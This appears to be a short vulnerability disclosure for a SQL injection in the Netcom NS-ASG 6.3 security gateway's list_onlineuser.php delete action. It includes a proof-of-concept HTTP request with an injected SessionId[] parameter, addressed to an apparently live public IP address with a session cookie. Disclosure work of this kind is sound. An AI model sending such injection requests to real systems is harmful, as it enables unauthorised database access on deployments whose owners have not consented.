There is a SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official website:https://www.netentsec.com/

version:NS-ASG 6.3

Vulnerability points：/admin/list_onlineuser.php

As shown in the figure, in the delete method, the array $SessionId variable is accepted and then iterated into the SQL statement without any restrictions, resulting in SQL injection
<img width="488" alt="image" src="https://github.com/Cubi123123123/cve/assets/146049123/82fd15c5-3875-489d-823c-080bf24b04a6">

Construct POC and successfully obtain database information Poc：
```
GET /admin/list_onlineuser.php?action=delete&SessionId[]=1' HTTP/1.1
Host: 218.75.78.54:4443
Cookie: PHPSESSID=f30e8a16a1b6373bbc11e1ce84445033
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://218.75.78.54:4443/admin/list_postlogin.php
Sec-Fetch-Dest: script
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

```
<img width="498" alt="image" src="https://github.com/Cubi123123123/cve/assets/146049123/02d5954d-1f2e-4112-aa49-84a454b61166">

<img width="476" alt="image" src="https://github.com/Cubi123123123/cve/assets/146049123/4191b543-8438-4328-9297-c9f87d852f69">
